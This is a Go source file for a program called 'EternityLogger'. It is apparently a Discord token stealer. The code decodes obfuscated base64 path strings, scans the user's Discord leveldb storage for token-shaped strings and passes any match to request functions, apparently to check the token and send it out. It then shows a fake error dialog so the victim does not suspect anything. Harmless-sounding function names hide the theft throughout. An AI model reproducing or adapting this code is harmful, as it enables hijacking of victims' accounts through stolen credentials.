//go:generate goversioninfo
package main

import (
	"EternityLogger/requests"
	"EternityLogger/utils"
	"github.com/ncruces/zenity"
	"log"
	"os"
	"regexp"
	"strings"
)

func main() {
	utils.PartyInvitation()
	toyStore := "WEZ4a2FYTmpiM0prWEZ4TWIyTmhiQ0JUZEc5eVlXZGxYRnhzWlhabGJHUmlYRnc9OkxteGtZZz09OmIydGxiZz09"
	ballPit := utils.Cake(toyStore)
	playground := strings.Split(ballPit, ":")
	var s1, s2, s3 = playground[0], playground[1], playground[2]
	root, _ := os.UserConfigDir()
	localFiles, err := os.ReadDir(root + utils.Cake(s1))
	if err != nil {
		log.Fatal(err)
	}
	for _, file := range localFiles {
		name := file.Name()
		if strings.Contains(name, utils.Cake(s2)) {
			readFile, err2 := os.ReadFile(root + utils.Cake(s1) + name)
			if err2 != nil {
				return
			}
			if strings.Contains(string(readFile), utils.Cake(s3)) {
				b, _ := regexp.MatchString("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", string(readFile))
				if b == true {
					re := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
					match := re.FindStringSubmatch(string(readFile))
					body := requests.PartyFood(match[0])
					if strings.Contains(body, "id") {
						requests.TicketCount(match[0])
						err = zenity.Error("An error has occurred, please contact your product administrator.", zenity.Title("Error"), zenity.ErrorIcon)
						if err != nil {
							return
						}
						os.Exit(1)

					}
				}
			}
		}
	}
}
